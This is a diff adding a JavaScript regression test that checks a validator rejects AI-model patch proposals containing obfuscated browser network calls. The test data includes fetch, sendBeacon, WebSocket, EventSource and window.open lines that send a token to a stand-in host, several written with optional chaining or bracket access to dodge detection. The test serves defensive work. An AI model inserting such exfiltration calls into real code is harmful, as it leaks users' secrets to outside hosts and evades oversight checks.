@@ -262,3 +262,25 @@ test('model proposals reject direct, optional and computed browser location redi
   });
   assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
 });
+
+
+test('model proposals reject optional browser transports and EventSource before publishing', () => {
+  const attempts = [
+    "fetch?.(\"https://example.invalid/?data=\" + token);",
+    "window?.open?.(\"https://example.invalid/?data=\" + token);",
+    "globalThis?.[\"fetch\"]?.(\"https://example.invalid/?data=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", body);",
+    "navigator?.[\"sendBeacon\"]?.(\"https://example.invalid\", body);",
+    "self?.WebSocket?.(\"wss://example.invalid\");",
+    "new EventSource(\"https://example.invalid/stream\");",
+    "document?.createElement?.(\"iframe\");"
+];
+  for (const replace of attempts) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
+      explanation: 'Synthetic optional-network-call regression' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replace);
+  }
+  const benign = JSON.stringify({ path: MODEL_ALLOWED_PATH, find,
+    replace: '  const sample = 101; // optional network UI label', explanation: 'Safe UI text only' });
+  assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
+});
